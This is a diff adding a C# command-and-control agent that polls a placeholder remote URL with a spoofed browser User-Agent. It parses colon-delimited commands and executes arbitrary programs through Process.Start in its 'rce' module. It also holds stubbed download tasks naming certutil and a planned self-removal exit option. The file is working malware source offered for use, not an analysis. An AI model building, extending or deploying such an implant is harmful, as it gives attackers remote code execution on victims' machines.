@@ -1,0 +1,262 @@
+﻿using System;
+using System.Net.Http;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Text.Json;
+using System.Threading.Tasks;
+using System.Net;
+
+public class C2Command
+{
+    public required string ModuleName { get; set; }
+    public required string ModuleTask { get; set; }
+    public required string TaskOptions { get; set; }
+    public bool HasErrors { get; set; }
+}
+
+public class C2Pac
+{
+    private static readonly HttpClient client = new HttpClient();
+    static string url = "http://<updateme>.com/something/page.html";
+    static char commandDelimiter = ':';
+    static int retrieveInterval = 30000;
+    static bool debugMode = false;
+    public static async Task Main(string[] args)
+    {
+        Console.WriteLine("[*] Starting C2 agent");
+
+        Console.WriteLine("[*] Querying C2 endpoint...");
+
+        while (true)
+        {
+            string c2Command = await RetrieveCommandFromHTTPGet();
+            if (c2Command == null)
+            {
+                Console.WriteLine("[!] ERROR: Unable to retrieve command, check C2 endpoint.");
+            }
+            else
+            {
+                Console.WriteLine("[*] Parsing C2 command");
+                //  extract command string from response
+                C2Command parsedCmd = ParseCommand(c2Command);
+                Console.WriteLine("[*] Executing C2 command");
+                //  execute the command
+                int cmdResult = ExecuteCommand(parsedCmd);
+                if (cmdResult > 0)
+                {
+                    Console.WriteLine("[!] ERROR: ExecuteCommand failed.");
+                }
+                else
+                {
+                    Console.WriteLine("[*] ExecuteCommand Succesful.");
+                }
+            }
+            Thread.Sleep(retrieveInterval);    
+        }
+    }
+    
+    //  parse raw string into C2Command object
+    public static C2Command ParseCommand(string inputCommand)
+    {
+        string[] splitCommand = inputCommand.Split(commandDelimiter);
+
+        if (debugMode)
+        {
+            Console.WriteLine("[*] Dumping inputCommand values:");
+            foreach (string commandElement in splitCommand)
+            {
+                Console.WriteLine(commandElement);
+            }
+        }
+
+        string moduleName = splitCommand[0];
+        string moduleTask = splitCommand[1];
+        string moduleOptions = splitCommand[2];
+
+        if (debugMode)
+        {
+            Console.WriteLine($"Module Name: {moduleName}");
+            Console.WriteLine($"Module Task: {moduleTask}");
+            Console.WriteLine($"Module Options: {moduleOptions}");
+        }
+
+        // enhanced processing of command line arguments
+        /*if (moduleOptions.Contains(' '))    //  parse out the arguments for the command
+        {
+            string[] commandArgumentList = inputCommand.Split(delimiter);
+            if (commandArgumentList != null)
+            {
+                foreach (string argument in commandArgumentList)
+                {
+                    Console.WriteLine($"Processing argument: {argument}");
+                }
+            }
+        }
+        else
+        {
+            Console.WriteLine("No arguments provided.");
+        }*/
+
+        return new C2Command
+        {
+            ModuleName = moduleName,
+            ModuleTask = moduleTask,
+            TaskOptions = moduleOptions
+        };
+    }
+
+    //  parse the command values and call the appropriate module
+    public static int ExecuteCommand(C2Command inputValues)
+    {
+        //  parse the ModuleName and call the corresponding function
+        if (inputValues.ModuleName == "rce")
+        {
+            if (debugMode)
+            {
+                Console.WriteLine("[*] Executing module: RCE");
+            }
+
+            int result = RceModule(inputValues.ModuleTask, inputValues.TaskOptions);
+            if (result >= 0)
+            {
+                Console.WriteLine("[*] Successful execution of RCE module.");
+            }
+            else
+            {
+                Console.WriteLine("[!] ERROR: Unrecognized task.");
+            }
+        }
+        else if (inputValues.ModuleName == "exit")
+        {
+            if (debugMode)
+            {
+                Console.WriteLine("[*] Executing module: RCE");
+            }
+            ExitModule(inputValues.ModuleTask, inputValues.TaskOptions);
+        }
+        else
+        {
+            Console.WriteLine("[!] ERROR: Unrecognized module.");
+        }
+        return 0;
+    }
+
+    //  remote code exection tasks
+    public static int RceModule(string task, string options)
+    {
+        if (task == "cmd")
+        {
+            if (debugMode)
+            {
+                Console.WriteLine("Executing task: CMD");
+            }
+            Process.Start(options);
+            return 0;
+        }
+        else
+        {
+            return -1;
+        }
+    }
+
+    // download tasks
+    public static int DownloadModule(string task, string options)
+    {
+        if (task == "client")
+        {
+            if (debugMode)
+            {
+                Console.WriteLine("Initiating download using TCP client");
+            }
+            //Process.Start(options);
+            return 0;
+        }
+        else if (task == "certutil")
+        {
+            Console.WriteLine("Initiating download using certutil.exe");
+            return 0;
+        }
+        else
+        {
+            return -1;
+        }
+    }
+    
+    // exit tasks
+    public static void ExitModule(string task, string options)
+    {
+        if (task == "quit")
+        {
+            if (debugMode)
+            {
+                Console.WriteLine("[*] Recieved an EXIT task");
+            }
+
+            if (options == "now")
+            {
+                Console.WriteLine("[*] Exiting process now.");
+                System.Environment.Exit(0);
+            }
+            else if (options == "remove")
+            {
+                //  drop delete script, which deletes this executable after a short wait
+                //  invoke delete script
+                //  terminate the current processs
+                Console.WriteLine("[*] TODO: Add code to remove, exiting now.");
+                System.Environment.Exit(0);
+            }
+            else
+            {
+                try
+                {
+                    int millisecondsToWait = Convert.ToInt32(options);
+                    Console.WriteLine($"[*] Sleeping for: {millisecondsToWait}");
+                    Thread.Sleep(millisecondsToWait);
+                    Console.WriteLine("[*] Exiting process now.");
+                    System.Environment.Exit(0);
+                }
+                catch (Exception)
+                {
+                    Console.WriteLine("[!] ERROR: Exception when parsing the delay.");
+                    Console.WriteLine("[*] Exiting process now.");
+                    System.Environment.Exit(0);
+                }
+            }
+        }
+    }
+
+    // this is where we swap out out C2 channel
+    public static async Task<string> RetrieveCommand()
+    {
+        string command = await RetrieveCommandFromHTTPGet();
+        return command;
+    }
+    
+    // HTTP GET PoC
+    public static async Task<string> RetrieveCommandFromHTTPGet()
+    {
+        try
+        {
+            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
+            request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
+            request.Headers.Add("X-Client-Id", "UpdateMe");
+            //request.Headers.Add("Accept", "application/json");
+
+            HttpResponseMessage response = await client.SendAsync(request);
+            response.EnsureSuccessStatusCode();
+
+            string responseBody = await response.Content.ReadAsStringAsync();
+            return responseBody;
+        }
+        catch (HttpRequestException e)
+        {
+            Console.WriteLine($"[!] ERROR: Request exception: {e.Message}");
+            return "Exception";
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine($"[!] ERROR: An unexpected error occurred: {e.Message}");
+            return "Exception";
+        }
+    }
+}
